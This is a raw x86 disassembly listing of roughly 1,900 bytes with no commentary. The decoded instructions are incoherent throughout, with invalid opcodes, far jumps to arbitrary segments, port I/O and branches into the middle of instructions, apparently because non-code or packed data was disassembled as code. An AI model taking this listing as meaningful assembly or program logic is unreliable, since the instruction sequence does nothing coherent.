  40d12e:	loop   0x40d138
  40d130:	es es leave 
  40d133:	jmp    0xd338:0x772269b1
  40d13a:	or     edx,edx
  40d13c:	or     al,0xca
  40d13e:	add    al,0xde
  40d140:	or     eax,0x48e4a8a
  40d145:	sti    
  40d146:	inc    dl
  40d148:	adc    BYTE PTR [esi+0x137b3759],bh
  40d14e:	push   ds
  40d14f:	push   ebp
  40d150:	adc    DWORD PTR [ebx+eax*8-0xf],ebp
  40d154:	scas   eax,DWORD PTR es:[edi]
  40d155:	into   
  40d156:	pop    ds
  40d157:	push   ss
  40d158:	fidivr WORD PTR [ebx+0x36]
  40d15b:	lock jge 0x40d135
  40d15e:	cmp    al,0xde
  40d160:	sub    al,0xaf
  40d162:	jb     0x40d16d
  40d164:	add    al,0x70
  40d166:	push   edx
  40d167:	xchg   esp,eax
  40d168:	(bad)  
  40d16a:	stos   DWORD PTR es:[edi],eax
  40d16b:	mov    bh,0xda
  40d16d:	jecxz  0x40d139
  40d16f:	cmp    ebx,DWORD PTR [eax]
  40d171:	sub    ebx,ebp
  40d173:	push   fs
  40d175:	cmp    eax,0x680f8b2f
  40d17a:	ss cmp al,0x2a
  40d17d:	push   cs
  40d17e:	shr    al,1
  40d180:	(bad)  
  40d181:	mov    esp,0x4077e04f
  40d186:	into   
  40d187:	ins    BYTE PTR es:[edi],dx
  40d188:	dec    ecx
  40d189:	jg     0x40d135
  40d18b:	mov    ds:0xc4caa222,al
  40d190:	sti    
  40d191:	push   ebx
  40d192:	jp     0x40d1b0
  40d194:	in     al,0x56
  40d196:	and    dl,bl
  40d198:	sbb    edx,ecx
  40d19a:	inc    ebx
  40d19b:	into   
  40d19c:	rol    BYTE PTR [ebx+0x5c],1
  40d19f:	int    0x40
  40d1a1:	fcmovb st,st(2)
  40d1a3:	(bad)  
  40d1a4:	jle    0x40d1e7
  40d1a6:	or     eax,0xb7ffcc88
  40d1ab:	mov    bh,0xd0
  40d1ad:	add    al,BYTE PTR [ecx-0x59]
  40d1b0:	fldcw  WORD PTR [edi]
  40d1b2:	retf   
  40d1b3:	fwait
  40d1b4:	out    0xcb,eax
  40d1b6:	pop    edi
  40d1b7:	out    dx,al
  40d1b8:	push   ebp
  40d1b9:	pop    esp
  40d1ba:	inc    ebp
  40d1bb:	xor    dh,BYTE PTR cs:[ecx]
  40d1be:	sbb    al,0xdc
  40d1c0:	push   edx
  40d1c1:	mov    eax,0x3e4a42d7
  40d1c6:	xchg   edx,ecx
  40d1c8:	imul   esp,DWORD PTR [esi-0x79],0x200ff255
  40d1cf:	push   ebx
  40d1d0:	adc    al,0x9b
  40d1d2:	test   eax,0xff673391
  40d1d7:	pop    es
  40d1d8:	xlat   BYTE PTR ds:[ebx]
  40d1d9:	jnp    0x40d194
  40d1db:	adc    al,0xc3
  40d1dd:	push   cs
  40d1de:	sbb    BYTE PTR [ecx],dh
  40d1e0:	mov    edi,0xbbb937ec
  40d1e5:	add    ch,BYTE PTR [edi+0x14]
  40d1e8:	xchg   ecx,eax
  40d1e9:	and    ah,BYTE PTR [ecx]
  40d1eb:	mov    ebp,0x8d0d67d2
  40d1f0:	xor    al,0xa3
  40d1f2:	ja     0x40d1b0
  40d1f4:	mov    esp,0x75e2a99c
  40d1f9:	push   edi
  40d1fa:	or     ch,al
  40d1fc:	mov    al,0x78
  40d1fe:	inc    esi
  40d1ff:	add    edx,DWORD PTR [esi-0x55edb5cb]
  40d205:	or     eax,0x8cc9d3b7
  40d20a:	loop   0x40d19e
  40d20c:	retf   0x5a42
  40d20f:	xchg   ebp,eax
  40d210:	xchg   cl,dl
  40d212:	mov    cl,BYTE PTR [edx]
  40d214:	xlat   BYTE PTR ds:[ebx]
  40d215:	fisttp QWORD PTR [edi]
  40d217:	mov    ecx,0x5017820e
  40d21c:	clc    
  40d21d:	lds    edi,FWORD PTR [ecx+ebx*2-0x743aed0c]
  40d224:	jg     0x40d1ad
  40d226:	pop    edx
  40d227:	shl    edx,cl
  40d229:	pop    ss
  40d22a:	loopne 0x40d23b
  40d22c:	adc    al,0x56
  40d22e:	push   ds
  40d22f:	jmp    0x93a3fe4a
  40d234:	fsubr  QWORD PTR [esi+0x5e]
  40d237:	sbb    DWORD PTR [edi],esp
  40d239:	add    ch,ah
  40d23b:	mov    dl,BYTE PTR [edx]
  40d23d:	mov    DWORD PTR [ebx-0x34],ebx
  40d240:	int3   
  40d241:	scas   al,BYTE PTR es:[edi]
  40d242:	jo     0x40d26d
  40d244:	cs inc ebp
  40d246:	jb     0x40d27c
  40d248:	inc    esp
  40d249:	jns    0x40d249
  40d24b:	xor    eax,0x1724f933
  40d250:	mov    gs,WORD PTR ds:0xf27dd642
  40d256:	mov    WORD PTR [ebx+0x16a440c3],ds
  40d25c:	in     al,0x83
  40d25e:	dec    ebx
  40d25f:	inc    ebp
  40d260:	test   ch,dl
  40d262:	xor    BYTE PTR [ebx],0x93
  40d265:	and    eax,0x2b14d920
  40d26a:	sbb    eax,0x720bac97
  40d26f:	or     eax,0x2f96a21e
  40d274:	mov    ecx,0xacfcce48
  40d279:	jbe    0x40d223
  40d27b:	enter  0x2c78,0x32
  40d27f:	xchg   esp,eax
  40d280:	addr16 jmp 0x3421:0x7a98ca4e
  40d288:	mov    ebp,0x3089538
  40d28d:	test   eax,0x4fa8f5ea
  40d292:	test   al,0xe6
  40d294:	aas    
  40d295:	fisub  DWORD PTR [ebx+0x6045c650]
  40d29b:	mov    al,0xfe
  40d29d:	repz bound eax,QWORD PTR [eax]
  40d2a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2a1:	ror    dl,0x78
  40d2a4:	loopne 0x40d262
  40d2a6:	xchg   al,ah
  40d2a8:	dec    edi
  40d2a9:	mov    ebp,0xde270265
  40d2ae:	dec    esp
  40d2af:	cmp    ebx,DWORD PTR [ecx-0x69]
  40d2b2:	cs leave 
  40d2b4:	ret    
  40d2b5:	mov    BYTE PTR [ebp+esi*1+0x62],dl
  40d2b9:	mov    WORD PTR [edi],gs
  40d2bb:	push   ebx
  40d2bc:	sbb    eax,0xf90f5e3f
  40d2c1:	dec    esp
  40d2c2:	cmps   DWORD PTR ss:[si],DWORD PTR es:[di]
  40d2c5:	popf   
  40d2c6:	repz push ebx
  40d2c8:	scas   al,BYTE PTR es:[edi]
  40d2c9:	mov    ds:0xc64ded07,al
  40d2ce:	jge    0x40d2a7
  40d2d0:	adc    ebp,edi
  40d2d2:	ja     0x40d2e8
  40d2d4:	mov    esi,0x27e9d487
  40d2d9:	popf   
  40d2da:	dec    edx
  40d2db:	dec    edi
  40d2dc:	lea    ecx,[esi-0x710543a]
  40d2e2:	sbb    cl,0xb3
  40d2e5:	fisubr WORD PTR [ecx]
  40d2e7:	jb     0x40d2ad
  40d2e9:	scas   eax,DWORD PTR es:[edi]
  40d2ea:	mov    edi,0x7dbbb02a
  40d2ef:	daa    
  40d2f0:	xor    cl,BYTE PTR ds:0xaf9d5bf1
  40d2f6:	sub    al,0x78
  40d2f8:	sub    eax,0xaeb60ac3
  40d2fd:	and    dh,bh
  40d2ff:	pop    ebx
  40d300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d301:	xchg   ebp,eax
  40d302:	mov    edi,0xa9595b22
  40d307:	outs   dx,BYTE PTR ds:[esi]
  40d308:	inc    ebp
  40d309:	adc    DWORD PTR [edx],edx
  40d30b:	retf   0x92c8
  40d30e:	sbb    ecx,DWORD PTR [eax+edx*4+0x72]
  40d312:	cli    
  40d313:	push   ebp
  40d314:	pushf  
  40d315:	or     BYTE PTR es:0x2930a385,0x67
  40d31d:	popa   
  40d31e:	(bad)  
  40d31f:	mov    esi,0x28997f3f
  40d324:	or     dh,BYTE PTR [ecx]
  40d326:	xchg   esi,eax
  40d327:	std    
  40d328:	and    DWORD PTR [edx-0x7f],0x4d
  40d32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d32d:	mov    bl,0x7e
  40d32f:	arpl   ax,ax
  40d331:	ret    0xee2d
  40d334:	out    dx,al
  40d335:	stc    
  40d336:	mov    edi,0x6c90aec5
  40d33b:	xor    eax,DWORD PTR [ebp+0x58de032b]
  40d341:	test   DWORD PTR [esi+0x7efa9099],ebp
  40d347:	inc    esi
  40d348:	frstor [ecx+esi*1]
  40d34b:	mov    edx,cs
  40d34d:	mov    ch,0x5b
  40d34f:	lea    esi,[ebx-0x65]
  40d352:	fsubr  QWORD PTR [edx-0x5f27e1d4]
  40d359:	dec    eax
  40d35a:	dec    edx
  40d35b:	push   ds
  40d35c:	ins    DWORD PTR es:[edi],dx
  40d35d:	out    dx,eax
  40d35e:	jnp    0x40d2e2
  40d360:	sar    BYTE PTR [edx-0x19],cl
  40d363:	push   0x70a9cdeb
  40d368:	mov    dl,0xb7
  40d36a:	mov    BYTE PTR [edx],dl
  40d36c:	fwait
  40d36d:	addr16 xchg edi,eax
  40d36f:	xchg   ebp,eax
  40d370:	fmul   QWORD PTR [eax+0x56]
  40d373:	icebp  
  40d374:	pusha  
  40d375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d376:	sub    DWORD PTR [edx-0x6c925711],0x24
  40d37d:	aaa    
  40d37e:	inc    DWORD PTR [edi+eax*2-0x14308564]
  40d385:	iret   
  40d386:	sub    ah,BYTE PTR [ebp+0xf]
  40d389:	fcmovne st,st(0)
  40d38b:	cs call 0x97980c28
  40d391:	inc    esp
  40d392:	pop    es
  40d393:	pop    ebx
  40d394:	out    dx,al
  40d395:	aas    
  40d396:	mov    BYTE PTR [eax-0x19669770],cl
  40d39c:	mov    edx,0x5400452b
  40d3a1:	(bad)  
  40d3a2:	nop
  40d3a3:	pop    esp
  40d3a4:	cmp    eax,0x76d8c23a
  40d3a9:	je     0x40d3a8
  40d3ab:	or     al,0x34
  40d3ad:	in     eax,dx
  40d3ae:	ins    DWORD PTR es:[edi],dx
  40d3af:	adc    al,0xa7
  40d3b1:	add    bl,bh
  40d3b3:	out    0xc9,al
  40d3b5:	xchg   ebp,eax
  40d3b6:	and    eax,0x5f7731de
  40d3bb:	pop    edi
  40d3bc:	fs inc esi
  40d3be:	xor    eax,0x11eaeb6e
  40d3c3:	mov    esi,0x8c87aebd
  40d3c8:	mov    bh,0x46
  40d3ca:	push   ecx
  40d3cb:	unpcklps xmm6,XMMWORD PTR [eax]
  40d3ce:	gs pop ds
  40d3d0:	jb     0x40d3d1
  40d3d2:	pop    eax
  40d3d3:	stc    
  40d3d4:	dec    esp
  40d3d5:	cli    
  40d3d6:	js     0x40d3c7
  40d3d8:	icebp  
  40d3d9:	sbb    BYTE PTR ds:0xf56d1d64,ah
  40d3df:	icebp  
  40d3e0:	mov    dh,0xa8
  40d3e2:	ja     0x40d3b2
  40d3e4:	push   0xdc89f118
  40d3e9:	and    edi,ebx
  40d3eb:	popf   
  40d3ec:	pop    ebx
  40d3ed:	nop
  40d3ee:	sbb    DWORD PTR [esi+0x48c32a5a],ebp
  40d3f4:	mov    bh,0xcb
  40d3f6:	out    dx,eax
  40d3f7:	test   WORD PTR [edi],0x3de0
  40d3fc:	leave  
  40d3fd:	(bad)  
  40d3fe:	test   eax,0x806c935a
  40d403:	sbb    edx,ecx
  40d405:	fwait
  40d406:	push   cs
  40d407:	mov    ecx,0x564c04e9
  40d40c:	rcl    BYTE PTR [ebx-0x1407161],1
  40d412:	rcr    DWORD PTR gs:[ecx+0x7dc80c38],1
  40d419:	and    eax,0xa2b47b78
  40d41e:	jne    0x40d45c
  40d420:	aaa    
  40d421:	mov    WORD PTR [edx],?
  40d423:	call   0xad92:0x695d9244
  40d42a:	mov    WORD PTR [ecx+eiz*4+0x1dfa3515],?
  40d431:	or     DWORD PTR [edi],edi
  40d433:	in     al,0x26
  40d435:	pushf  
  40d436:	ja     0x40d3cf
  40d438:	sub    esp,DWORD PTR [esi+0x54]
  40d43b:	adc    dh,bl
  40d43d:	pushf  
  40d43e:	or     BYTE PTR [ebp-0x6523659c],0x0
  40d445:	jnp    0x40d4af
  40d447:	adc    DWORD PTR [eax+eiz*8],0xffffffea
  40d44b:	and    bh,BYTE PTR [ecx+0x7a79c580]
  40d451:	mov    ebx,0xabedcd13
  40d456:	cli    
  40d457:	add    DWORD PTR [esi+0xd419ec0],ebx
  40d45d:	jecxz  0x40d4b0
  40d45f:	fwait
  40d460:	jmp    0x40d430
  40d462:	sbb    DWORD PTR [eax-0x773ea295],0xd5b3d6c8
  40d46c:	push   es
  40d46d:	sub    eax,ebp
  40d46f:	loop   0x40d405
  40d471:	mov    ah,0x56
  40d473:	(bad)  
  40d474:	fcomp  DWORD PTR [esi+0x1d5a0dc4]
  40d47a:	mov    cl,0x19
  40d47c:	aam    0xa1
  40d47e:	pop    ecx
  40d47f:	arpl   WORD PTR [edi],si
  40d481:	xchg   edi,eax
  40d482:	sbb    eax,0xcd623ba6
  40d487:	pop    eax
  40d488:	loope  0x40d445
  40d48a:	std    
  40d48b:	inc    edi
  40d48c:	and    bl,BYTE PTR [ebx+edi*4]
  40d48f:	fdivrp st(3),st
  40d491:	xchg   esp,eax
  40d492:	xchg   edi,eax
  40d493:	out    0xd6,al
  40d495:	adc    BYTE PTR [edx-0x18],bh
  40d498:	jbe    0x40d4d8
  40d49a:	jnp    0x40d425
  40d49c:	test   eax,0x87800c03
  40d4a1:	fs inc ebx
  40d4a3:	pop    ds
  40d4a4:	inc    ebp
  40d4a5:	sub    BYTE PTR [esi],0x34
  40d4a8:	sub    ah,BYTE PTR [ebx-0x3d780d2]
  40d4ae:	adc    dl,0x5f
  40d4b1:	mov    esp,0xb2398a48
  40d4b6:	xor    al,0x47
  40d4b8:	and    eax,DWORD PTR [esi]
  40d4ba:	bound  ebx,QWORD PTR [ebp-0x16]
  40d4bd:	fild   QWORD PTR [ebp+0x4]
  40d4c0:	lock sub al,0xdf
  40d4c3:	pop    esp
  40d4c4:	jge    0x40d467
  40d4c6:	mov    bl,0x34
  40d4c8:	mov    edx,0x31e5ce8a
  40d4cd:	nop
  40d4ce:	and    eax,0x927b484b
  40d4d3:	jbe    0x40d543
  40d4d5:	lods   eax,DWORD PTR ds:[esi]
  40d4d6:	xor    al,0xf9
  40d4d8:	daa    
  40d4d9:	or     cl,bl
  40d4db:	cmp    al,0x58
  40d4dd:	and    dl,BYTE PTR [ebp-0x7b]
  40d4e0:	cld    
  40d4e1:	dec    edx
  40d4e2:	in     al,0x65
  40d4e4:	loopne 0x40d51a
  40d4e6:	or     ah,BYTE PTR [edx+eax*2-0x6f576f2f]
  40d4ed:	adc    cl,bh
  40d4ef:	popf   
  40d4f0:	push   eax
  40d4f1:	(bad)  
  40d4f2:	rcl    BYTE PTR [edx+0x66],1
  40d4f5:	mov    ch,0x46
  40d4f7:	out    0xb9,eax
  40d4f9:	fldenv [edx-0x36e44f1c]
  40d4ff:	bound  ebp,QWORD PTR [ebp+eiz*8-0x51]
  40d503:	fisttp DWORD PTR [ecx-0x1c]
  40d506:	pop    eax
  40d507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d508:	sub    DWORD PTR [edx+0x40aee429],ebx
  40d50e:	mov    ch,BYTE PTR [eax]
  40d510:	cli    
  40d511:	mov    ebx,DWORD PTR [ebp-0x76a79ecd]
  40d517:	add    cl,BYTE PTR [edx]
  40d519:	clc    
  40d51a:	sbb    bh,BYTE PTR [edi-0x2e]
  40d51d:	adc    ebp,DWORD PTR [edx]
  40d51f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d520:	sbb    BYTE PTR [ecx-0x7df93823],ch
  40d526:	pop    cx
  40d528:	dec    esi
  40d529:	fisttp DWORD PTR [edi+0x3b823b07]
  40d52f:	retf   0x3d8f
  40d532:	out    0x47,al
  40d534:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40d536:	es jle 0x40d4bd
  40d539:	mov    DWORD PTR [ebx],edi
  40d53b:	fmul   DWORD PTR [eax-0x16]
  40d53e:	sub    DWORD PTR [eax-0x3a98cb4e],ebx
  40d544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d545:	xchg   ebx,eax
  40d546:	dec    edx
  40d547:	jmp    0x40d5ba
  40d549:	mov    ds:0x1f89eb09,al
  40d54e:	test   BYTE PTR [edi+0x2555b2f8],0x9a
  40d555:	sbb    DWORD PTR [ebx+0x87a28cc],ebp
  40d55b:	and    al,BYTE PTR [eax-0xc88ba29]
  40d561:	jp     0x40d550
  40d563:	enter  0x2fba,0x81
  40d567:	shr    BYTE PTR [eax],1
  40d569:	adc    DWORD PTR [ecx],esp
  40d56b:	mov    cl,0xb5
  40d56d:	push   cs
  40d56e:	in     eax,0x65
  40d570:	sbb    cl,BYTE PTR [edx+0x24]
  40d573:	in     eax,0x9f
  40d575:	mov    ch,0x8a
  40d577:	ins    BYTE PTR es:[edi],dx
  40d578:	shr    bl,0x1c
  40d57b:	pushf  
  40d57c:	outs   dx,BYTE PTR ds:[esi]
  40d57d:	clc    
  40d57e:	pop    ecx
  40d57f:	call   0xcd4861c5
  40d584:	mov    WORD PTR [edi-0x65c1ba5f],gs
  40d58a:	and    dl,BYTE PTR ds:0x64430772
  40d590:	xchg   ebp,eax
  40d591:	inc    edi
  40d592:	ror    DWORD PTR [ebx],0x2
  40d595:	in     eax,dx
  40d596:	mov    ah,0x8f
  40d598:	jge    0x40d618
  40d59a:	fcmove st,st(6)
  40d59c:	push   ss
  40d59d:	in     eax,0xec
  40d59f:	adc    eax,0x2fe9c41c
  40d5a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5a5:	ror    BYTE PTR [esi],1
  40d5a7:	dec    eax
  40d5a8:	mov    ecx,0xbbe4f3b0
  40d5ad:	test   BYTE PTR [eax],cl
  40d5af:	mov    dh,0xf6
  40d5b1:	sub    eax,0x4416c196
  40d5b6:	ss gs cmp eax,0x3019b479
  40d5bd:	das    
  40d5be:	jl     0x40d599
  40d5c0:	adc    DWORD PTR [ecx-0x8e2afb7],edi
  40d5c6:	in     eax,dx
  40d5c7:	and    DWORD PTR [edi],eax
  40d5c9:	xor    BYTE PTR [esi],dl
  40d5cb:	xlat   BYTE PTR ds:[ebx]
  40d5cc:	and    DWORD PTR [edx],edi
  40d5ce:	cmp    al,0x54
  40d5d0:	rcr    DWORD PTR [edx+0x2958d3fe],1
  40d5d6:	(bad)  
  40d5d7:	imul   ebp,ebp,0x5d37b2cf
  40d5dd:	mov    DWORD PTR [ecx],ecx
  40d5df:	fisub  WORD PTR [edi+0x867d6df]
  40d5e5:	pop    edi
  40d5e6:	jne    0x40d569
  40d5e8:	rcl    DWORD PTR [ecx-0x51],0x25
  40d5ec:	out    dx,al
  40d5ed:	xchg   ebp,eax
  40d5ee:	das    
  40d5ef:	or     DWORD PTR [eax],ebx
  40d5f1:	cmp    DWORD PTR [eax],ebp
  40d5f3:	loope  0x40d5b1
  40d5f5:	rol    DWORD PTR [edx],1
  40d5f7:	(bad)  
  40d5f8:	xchg   edx,eax
  40d5f9:	mov    esi,0x7f15ce85
  40d5fe:	ret    
  40d5ff:	xor    DWORD PTR [edx-0x7c],edx
  40d602:	frstor [esi]
  40d604:	aaa    
  40d605:	mov    DWORD PTR [ebp-0x11],0xa32db564
  40d60c:	stc    
  40d60d:	dec    ebx
  40d60e:	inc    ecx
  40d60f:	loope  0x40d623
  40d611:	xor    DWORD PTR [esi],0xcbb042de
  40d617:	sbb    DWORD PTR [esi+0x5b3a384c],esi
  40d61d:	test   BYTE PTR [eax+0x3671e9e0],ah
  40d623:	fsub   DWORD PTR [edi+0x4d1154d]
  40d629:	and    eax,0x77ec8b70
  40d62e:	mov    ah,0x49
  40d630:	je     0x40d67a
  40d632:	scas   eax,DWORD PTR es:[edi]
  40d633:	adc    al,0x4
  40d635:	mov    ebx,0x9af9da59
  40d63a:	sub    bl,BYTE PTR [esi-0x1e8b2972]
  40d640:	stos   BYTE PTR es:[edi],al
  40d641:	(bad)  
  40d642:	push   ecx
  40d643:	jbe    0x40d5d4
  40d645:	cmc    
  40d646:	and    DWORD PTR [eax],edi
  40d648:	scas   al,BYTE PTR es:[edi]
  40d649:	inc    edi
  40d64a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d64b:	mov    ?,WORD PTR ds:0xe8387757
  40d651:	clc    
  40d652:	xchg   ebp,eax
  40d653:	ss cmp eax,0xa91e6b19
  40d659:	imul   eax,DWORD PTR ds:0xf9b01bad,0x4669e81d
  40d663:	pop    esp
  40d664:	out    dx,al
  40d665:	adc    eax,esp
  40d667:	inc    edi
  40d668:	jmp    0x32a:0x63482d73
  40d66f:	div    BYTE PTR [edi-0x10938283]
  40d675:	int    0x9b
  40d677:	sub    bh,BYTE PTR [ecx-0x28e9c559]
  40d67d:	fistp  QWORD PTR [eax+0x1d]
  40d680:	push   0xffffffe7
  40d682:	dec    edi
  40d683:	out    dx,al
  40d684:	(bad)  
  40d686:	xchg   ecx,eax
  40d687:	enter  0x24cd,0x1d
  40d68b:	ror    BYTE PTR [ecx],1
  40d68d:	mov    dh,0xa0
  40d68f:	jmp    0x40d6d3
  40d691:	jns    0x40d63b
  40d693:	fldcw  WORD PTR [ecx]
  40d695:	dec    ecx
  40d696:	aam    0xca
  40d698:	cmp    eax,esp
  40d69a:	push   edx
  40d69b:	sub    al,0x7f
  40d69d:	les    esi,FWORD PTR [esi+edi*2+0x46]
  40d6a1:	inc    esi
  40d6a2:	or     eax,0x72847840
  40d6a7:	clc    
  40d6a8:	test   eax,0xb5395076
  40d6ad:	rep ins BYTE PTR es:[edi],dx
  40d6af:	leave  
  40d6b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6b1:	sub    BYTE PTR ds:0x99110c6a,0x26
  40d6b8:	dec    edx
  40d6b9:	cli    
  40d6ba:	pop    edi
  40d6bb:	cmp    BYTE PTR [esi+ecx*1+0x4b9910cf],0x3b
  40d6c3:	mov    BYTE PTR [edx-0x5f117b32],bl
  40d6c9:	fild   WORD PTR [edi-0x37]
  40d6cc:	gs inc edi
  40d6ce:	outs   dx,DWORD PTR ds:[esi]
  40d6cf:	pop    edi
  40d6d0:	lods   eax,DWORD PTR ds:[esi]
  40d6d1:	stc    
  40d6d2:	outs   dx,DWORD PTR ds:[esi]
  40d6d3:	jmp    0x40d6e1
  40d6d5:	loope  0x40d6ed
  40d6d7:	adc    ch,BYTE PTR [ecx-0x6d7bc024]
  40d6dd:	mov    DWORD PTR [eax+0xb],ebx
  40d6e0:	mov    eax,ds:0x4f63202f
  40d6e5:	dec    edi
  40d6e6:	adc    eax,0x7e4fe37c
  40d6eb:	mov    ah,0xb7
  40d6ed:	test   BYTE PTR [eax+0x56],bh
  40d6f0:	mov    ds:0x37dd2725,eax
  40d6f5:	outs   dx,DWORD PTR ds:[esi]
  40d6f6:	add    ah,BYTE PTR [edx-0x66ce1f02]
  40d6fc:	xor    esi,ebp
  40d6fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ff:	sub    DWORD PTR [edx+0x35],esi
  40d702:	sbb    esp,esp
  40d704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d705:	push   esp
  40d706:	gs pop es
  40d708:	pop    edx
  40d709:	dec    edx
  40d70a:	mov    edx,DWORD PTR [ecx]
  40d70c:	sbb    eax,0x64f88e85
  40d711:	inc    ecx
  40d712:	out    dx,al
  40d713:	fs mov dh,0x70
  40d716:	jne    0x40d74a
  40d718:	sbb    DWORD PTR [ecx],0x5a
  40d71b:	mov    ss,WORD PTR [ebx+0x26]
  40d71e:	mov    cl,0x86
  40d720:	cdq    
  40d721:	pop    esp
  40d722:	jg     0x40d742
  40d724:	sub    ah,al
  40d726:	or     eax,0x4eab1952
  40d72b:	mov    dl,0xfd
  40d72d:	mov    dl,0x2d
  40d72f:	sbb    DWORD PTR [ebx-0x2630940b],0x19
  40d736:	out    dx,eax
  40d737:	(bad)  
  40d738:	cld    
  40d739:	out    dx,al
  40d73a:	int    0xe7
  40d73c:	retf   0xc566
  40d73f:	jp     0x40d796
  40d741:	pop    es
  40d742:	js     0x40d730
  40d744:	ins    DWORD PTR es:[edi],dx
  40d745:	ss enter 0x7be0,0xd1
  40d74a:	jo     0x40d728
  40d74c:	test   al,0xeb
  40d74e:	pop    eax
  40d74f:	xchg   ecx,eax
  40d750:	shl    bh,1
  40d752:	fs fwait
  40d754:	mov    eax,ds:0x52f1a44a
  40d759:	sub    dl,bh
  40d75b:	and    esi,DWORD PTR [eax-0x34]
  40d75e:	repz or ebp,ecx
  40d761:	jecxz  0x40d784
  40d763:	and    eax,DWORD PTR [edi+0x11]
  40d766:	xor    ebx,DWORD PTR [edx]
  40d768:	(bad)  
  40d76a:	(bad)  
  40d76b:	sbb    bl,BYTE PTR [edi-0x20200d64]
  40d771:	push   esi
  40d772:	mov    ds:0x3f18331d,al
  40d777:	xor    DWORD PTR [ebp+eiz*4+0x57c60018],ebx
  40d77e:	xchg   edx,eax
  40d77f:	je     0x40d772
  40d781:	jae    0x40d7a5
  40d783:	lock (bad) [ebx+ebx*2+0x78]
  40d788:	xor    al,0x0
  40d78a:	outs   dx,DWORD PTR ds:[esi]
  40d78b:	lock push eax
  40d78d:	cmp    DWORD PTR [esi-0x1e54d821],ebx
  40d793:	inc    ebx
  40d794:	add    al,0x26
  40d796:	xor    esp,ebx
  40d798:	mov    DWORD PTR [eax],eax
  40d79a:	inc    ecx
  40d79b:	mov    esi,0x142a34c1
  40d7a0:	jb     0x40d7e0
  40d7a2:	mov    dh,0xc9
  40d7a4:	(bad)  
  40d7a5:	rcl    BYTE PTR [ebx],0x2b
  40d7a8:	shr    DWORD PTR [edi-0x59765d13],1
  40d7ae:	sar    DWORD PTR [ebx+0x35b596ae],1
  40d7b4:	dec    ecx
  40d7b5:	sub    ebx,DWORD PTR [ebx]
  40d7b7:	je     0x40d7f7
  40d7b9:	mov    DWORD PTR [ebx],ebx
  40d7bb:	lahf   
  40d7bc:	iret   
  40d7bd:	(bad)  
  40d7be:	and    DWORD PTR fs:[eax-0x23],esp
  40d7c2:	pop    esi
  40d7c3:	sti    
  40d7c4:	retf   0x3862
  40d7c7:	sbb    BYTE PTR [esi],ch
  40d7c9:	lahf   
  40d7ca:	lods   al,BYTE PTR ds:[esi]
  40d7cb:	addr16 push ecx
  40d7cd:	fs xchg esp,eax
  40d7cf:	inc    esi
  40d7d0:	push   esp
  40d7d1:	xor    al,0xc2
  40d7d3:	xor    BYTE PTR [ebx],bl
  40d7d5:	or     ecx,DWORD PTR [edx+edi*4-0x6b77e8ba]
  40d7dc:	jecxz  0x40d76c
  40d7de:	inc    esi
  40d7df:	dec    ebx
  40d7e0:	xor    dl,al
  40d7e2:	xlat   BYTE PTR ds:[ebx]
  40d7e3:	push   ebx
  40d7e4:	jbe    0x40d853
  40d7e6:	mov    ah,0xdf
  40d7e8:	xlat   BYTE PTR ds:[ebx]
  40d7e9:	sub    ebp,edi
  40d7eb:	je     0x40d84b
  40d7ed:	pop    edi
  40d7ee:	xchg   esi,eax
  40d7ef:	jle    0x40d857
  40d7f1:	push   es
  40d7f2:	cmp    DWORD PTR [esi+0x7c],esi
  40d7f5:	enter  0x3af8,0xcf
  40d7f9:	out    0xc1,eax
  40d7fb:	mov    esp,0x887f102b
  40d800:	je     0x40d84d
  40d802:	add    ebp,0xf
  40d805:	push   ebp
  40d806:	outs   dx,BYTE PTR ds:[esi]
  40d807:	jge    0x40d7a6
  40d809:	cmp    DWORD PTR [edx-0x79],edi
  40d80c:	sahf   
  40d80d:	mov    cl,ch
  40d80f:	retf   0x65a8
  40d812:	in     eax,0x74
  40d814:	sbb    bh,BYTE PTR [ecx]
  40d816:	jg     0x40d7e8
  40d818:	inc    ecx
  40d819:	inc    esp
  40d81a:	cmp    DWORD PTR [eax],ebx
  40d81c:	cs inc esp
  40d81e:	jnp    0x40d7a9
  40d820:	push   0xd48f59a6
  40d825:	and    dl,cl
  40d827:	xchg   ebx,eax
  40d828:	in     al,0xe4
  40d82a:	stos   DWORD PTR es:[edi],eax
  40d82b:	cmp    dh,BYTE PTR [esi]
  40d82d:	ins    BYTE PTR es:[edi],dx
  40d82e:	sahf   
  40d82f:	xor    DWORD PTR [edx],edx
  40d831:	jmp    0x27ddb709
  40d836:	mul    eax
  40d838:	dec    esi
  40d839:	arpl   bx,ax
  40d83b:	push   edi
  40d83c:	test   BYTE PTR [ebx-0x42848835],0x73
  40d843:	or     eax,0xa6a1aeef
  40d848:	gs addr16 (bad) 
  40d84b:	cli    
  40d84c:	add    eax,edi
  40d84e:	jae    0x40d829
  40d850:	push   DWORD PTR [ebp+0xe581e04]
  40d856:	adc    BYTE PTR ds:0x4cd67f0a,dh
  40d85c:	jbe    0x40d81d
  40d85e:	jnp    0x40d80e
  40d860:	(bad)  
  40d862:	xchg   BYTE PTR [edx-0x51],cl
  40d865:	pop    esi
  40d866:	mov    edi,0x4d539758
  40d86b:	pushf  
  40d86c:	mov    eax,ds:0x3f5a95f7
  40d871:	inc    ebp
  40d872:	aad    0x6c
  40d874:	mov    eax,0x8e5725e5
  40d879:	fdivp  st(3),st
  40d87b:	mov    al,0xc4
  40d87d:	jmp    0xa466:0x76c23fff
  40d884:	ins    BYTE PTR es:[edi],dx
  40d885:	add    dh,BYTE PTR [esi]
  40d887:	adc    eax,0x14fe24a8
  40d88c:	or     DWORD PTR [ebx-0x4e],edx
  40d88f:	sbb    DWORD PTR [edx+esi*8-0x20],0xca410fd1
  40d897:	mov    ecx,0xc8fb6700
  40d89c:	xchg   esp,eax
  40d89d:	ret    
  40d89e:	push   ss
  40d89f:	xchg   ebx,eax
  40d8a0:	or     esi,eax
  40d8a2:	out    0xed,eax
  40d8a4:	lahf   
